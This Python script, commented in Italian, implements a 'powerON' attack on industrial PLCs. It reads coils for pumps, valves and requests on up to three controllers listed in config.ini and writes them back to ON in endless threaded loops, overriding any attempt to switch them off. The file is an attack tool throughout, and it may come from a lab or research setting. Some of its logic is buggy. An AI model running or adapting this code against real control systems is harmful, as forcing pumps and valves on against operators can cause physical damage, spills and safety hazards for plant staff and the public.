import configparser
import threading

def attack(ctx):
    """
    Questa classe è dedicata a settare i parametri al fine di configurare l'attacco powerON sulle
    plc inserite (tutti i parametri sono estratti dal file 'config.ini).
    L'attacco powerON è una tipologia di attacco basato su trigger che viene lanciato in loop verso
    gli indirizzi ip:porta scelti e memorizzati nel file 'config.ini'.

    Funzionamento powerON:
    Vengono letti gli stati correnti delle plc selezionate e viene inviato un pacchetto con valore pari 
    a 1 (ON) se quella coil al momento è in stato 0 (OFF). (accensione forzata) 
    Se la coil è impostata su 1 (ON) si attende che il sistema provi a spegnera per poi 
    forzare nuovamente l'accesione mandando un payload pari a 1 sulla coil.
    Questo avviene all'interno di un loop infinito che si conclude attraverso l'utente che 
    preme il bottone 'stop attack' o chiudendo il programma.

    Questo attacco è inoltrabile a più coil in contemporanea grazie all'uso di threads diverse.
    """
    def on_status_mode():    
        counter = 0  
        while True:
            if coil_register_pump.read() == 0:
                coil_register_pump.write(1)
            else:
                print("Già accesa, aspetto...")
            
            if coil_register_valve.read() == 0:
                coil_register_valve.write(1)
            else:
                print("Già accesa, aspetto...")

            if coil_register_req.read() == 0:
                coil_register_req.write(1)
            else:
                print("Già accesa, aspetto...")

            print("\n")
            print("Pacchetto n°: " + str(counter))
            counter += 1
  
    def on_status_mode2():    
        counter2 = 0  
        while True:
            if coil_register_pump2.read() == 0:
                coil_register_pump2.write(1)
            else:
                print("Già accesa, aspetto...")
            
            if coil_register_valve2.read() == 0:
                coil_register_valve2.write(1)
            else:
                print("Già accesa, aspetto...")

            if coil_register_req2.read() == 0:
                coil_register_req2.write(1)
            else:
                print("Già accesa, aspetto...")

            print("\n")
            print("Pacchetto n°: " + str(counter2))
            counter2 += 1
 
    def on_status_mode3():    
        counter3 = 0  
        while True:
            if coil_register_pump3.read() == 0:
                coil_register_pump3.write(1)
            else:
                print("Già accesa, aspetto...")
            
            if coil_register_valve3.read() == 0:
                coil_register_valve3.write(1)
            else:
                print("Già accesa, aspetto...")

            if coil_register_req3.read() == 0:
                coil_register_req3.write(1)
            else:
                print("Già accesa, aspetto...")

            print("\n")
            print("Pacchetto n°: " + str(counter3))
            counter3 += 1

    def start_polling1():
        input_register1.start_polling(500, on_status_mode())

    def start_polling2():
        input_register2.start_polling(500, on_status_mode2())
        
    def start_polling3():
        input_register3.start_polling(500, on_status_mode3())

    config = configparser.ConfigParser()
    config.read('config.ini')

    input_register1     = ctx.register('plc1', 'I', 0)  #Leggo il valore di %IW0 (level)
    coil_register_pump  = ctx.register('plc1', 'C', 0)  #Equivale a scrivere 1 o 0 su %QX0.0 (pumps)
    coil_register_valve = ctx.register('plc1', 'C', 1)  #Equivale a scrivere 1 o 0 su %QX0.1 (valve)
    coil_register_req   = ctx.register('plc1', 'C', 2)  #Equivale a scrivere 1 o 0 su %QX0.2 (request)

    input_register2      = ctx.register('plc2', 'I', 0)  #Leggo il valore di %IW0 (level)
    coil_register_pump2  = ctx.register('plc2', 'C', 0)  #Equivale a scrivere 1 o 0 su %QX0.0 (pumps)
    coil_register_valve2 = ctx.register('plc2', 'C', 1)  #Equivale a scrivere 1 o 0 su %QX0.1 (valve)
    coil_register_req2   = ctx.register('plc2', 'C', 2)  #Equivale a scrivere 1 o 0 su %QX0.2 (request)

    input_register3      = ctx.register('plc3', 'I', 0)  #Leggo il valore di %IW0 (level)
    coil_register_pump3  = ctx.register('plc3', 'C', 0)  #Equivale a scrivere 1 o 0 su %QX0.0 (pumps)
    coil_register_valve3 = ctx.register('plc3', 'C', 1)  #Equivale a scrivere 1 o 0 su %QX0.1 (valve)
    coil_register_req3   = ctx.register('plc3', 'C', 2)  #Equivale a scrivere 1 o 0 su %QX0.2 (request)



    #ATTACCO UNA SOLA PLC (la prima della lista)
    if config.get('plc', 'plc1') == config.get('plc', 'plc2') and config.get('plc', 'plc2') == config.get('plc', 'plc3'):
        print("Attacco ad una plc!")
        print("Attacco ad una plc!")
        parte_prima_del_due_punti = str(config.get('plc', 'plc1')).split(':')[0]
        lastSector = parte_prima_del_due_punti.split('.')[3]
        print(lastSector)

        cifra_intera = int(lastSector)
        ultima_cifra = cifra_intera % 10
        
        if ultima_cifra == 1:
            input_register1.start_polling(500, on_status_mode())
        elif ultima_cifra == 2:
            input_register2.start_polling(500, on_status_mode2())
        elif ultima_cifra == 3:
            input_register3.start_polling(500, on_status_mode3())
###############################################################################################################

    #ATTACCO SU DUE PLC
    if config.get('plc', 'plc1') != "" and config.get('plc', 'plc3') == config.get('plc', 'plc1') and config.get('plc', 'plc1') != config.get('plc', 'plc2'):
        print("Attacco a due plc in contemporanea!")       
        parte_prima_del_due_punti = str(config.get('plc', 'plc1')).split(':')[0]
        lastSector = parte_prima_del_due_punti.split('.')[3]
        print(lastSector)

        cifra_intera = int(lastSector)
        ultima_cifra = cifra_intera % 10



        parte_prima_del_due_punti2 = str(config.get('plc', 'plc2')).split(':')[0]
        lastSector2 = parte_prima_del_due_punti2.split('.')[3]
        print(lastSector2)

        cifra_intera2 = int(lastSector2)
        ultima_cifra2 = cifra_intera2 % 10


        if ultima_cifra == 1 and ultima_cifra2 == 2:
            thread1 = threading.Thread(target=start_polling1)
            thread2 = threading.Thread(target=start_polling2)

            # Avvia i thread
            thread1.start()
            thread2.start()

            # Attendere che i thread completino l'esecuzione
            thread1.join()
            thread2.join()

        elif ultima_cifra == 1 and ultima_cifra2 == 3:
            thread1 = threading.Thread(target=start_polling1)
            thread3 = threading.Thread(target=start_polling3)

            # Avvia i thread
            thread1.start()
            thread3.start()

            # Attendere che i thread completino l'esecuzione
            thread1.join()
            thread3.join()

        elif ultima_cifra == 2 and ultima_cifra2 == 3:
            thread2 = threading.Thread(target=start_polling2)
            thread3 = threading.Thread(target=start_polling3)

            # Avvia i thread
            thread2.start()
            thread3.start()

            # Attendere che i thread completino l'esecuzione
            thread2.join()
            thread3.join()
###############################################################################################################

    #ATTACCO SU TRE PLC
    if config.get('plc', 'plc1') != config.get('plc', 'plc2') and config.get('plc', 'plc2') != config.get('plc', 'plc3'):
        print("Attacco a tre plc in contemporanea!")

        # Crea i thread per eseguire le due funzioni
        thread1 = threading.Thread(target=start_polling1)
        thread2 = threading.Thread(target=start_polling2)
        thread3 = threading.Thread(target=start_polling3)

        # Avvia i thread
        thread1.start()
        thread2.start()
        thread3.start()

        # Attendere che i thread completino l'esecuzione
        thread1.join()
        thread2.join()
        thread3.join()
###############################################################################################################
